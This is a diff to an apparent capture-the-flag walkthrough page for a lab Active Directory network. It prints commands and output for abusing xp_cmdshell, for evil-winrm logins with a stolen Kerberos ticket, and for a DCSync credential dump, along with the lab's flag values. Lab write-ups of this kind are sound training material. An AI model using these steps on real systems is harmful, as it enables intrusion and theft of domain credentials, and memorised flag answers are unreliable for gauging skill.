@@ -277,6 +277,7 @@
     </tbody>
   </table>
   <div class="flags">
+    <div class="flag"><span>DB26 · first &nbsp;</span>aabe0466c5c6cd2d4c4a87407a855de7</div>
     <div class="flag"><span>DC20 &nbsp;</span>515be42827aa53c5603af78eda4c0aa0</div>
     <div class="flag"><span>MGMT22 &nbsp;</span>3b26b1fd914a86be6a4dcaab4df64eb7</div>
   </div>
@@ -397,9 +398,10 @@
       node:"db26", host:"DB26 · as the SQL service",
       title:"xp_cmdshell gives command execution",
       tags:["rce","gain access"],
-      body:"<p>This is the moment the box fell. <code>e.ross</code> was <b>not</b> a sysadmin and had no impersonation rights, but the SQL instance had <code>xp_cmdshell</code> enabled, so a normal login could run OS commands as the SQL service account.</p>",
+      body:"<p>This is the moment the box fell. <code>e.ross</code> was <b>not</b> a sysadmin and had no impersonation rights, but the SQL instance had <code>xp_cmdshell</code> enabled, so a normal login could run OS commands as the SQL service account.</p><p>The <b>first flag</b> was already reachable from here — it sits on the Administrator desktop, and the same shell reads it.</p>",
       cmds:[
-        {l:"Enable and run",c:"SQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell hostname\nSQL> xp_cmdshell \"whoami /priv\""}
+        {l:"Enable and run",c:"SQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell hostname\nSQL> xp_cmdshell \"whoami /priv\""},
+        {l:"First flag",c:"SQL> xp_cmdshell \"type C:\\Users\\Administrator\\Desktop\\proof.txt\"\n\noutput: aabe0466c5c6cd2d4c4a87407a855de7"}
       ]
     },
     {
@@ -467,9 +469,9 @@
     },
     {
       node:"dc20", host:"DC20 + MGMT22 · objectives",
-      title:"Both flags, then the whole domain",
+      title:"The last two flags, then the whole domain",
       tags:["flags","dcsync"],
-      body:"<p>With a Domain Admin ticket, <code>proof.txt</code> is on the Administrator desktop of both hosts. DCSync then dumps every credential in the domain, including <code>krbtgt</code>.</p>",
+      body:"<p>With a Domain Admin ticket, <code>proof.txt</code> is on the Administrator desktop of both second-network hosts. DCSync then dumps every credential in the domain, including <code>krbtgt</code>.</p>",
       cmds:[
         {l:"DC20 flag",c:"evil-winrm -i dc20.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -K /tmp/a.r.andrews.ccache\nPS> Get-Content C:/Users/Administrator/Desktop/proof.txt\n515be42827aa53c5603af78eda4c0aa0"},
         {l:"MGMT22 flag",c:"evil-winrm -i mgmt22.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -K /tmp/a.r.andrews.ccache\nPS> Get-Content C:/Users/Administrator/Desktop/proof.txt\n3b26b1fd914a86be6a4dcaab4df64eb7"},
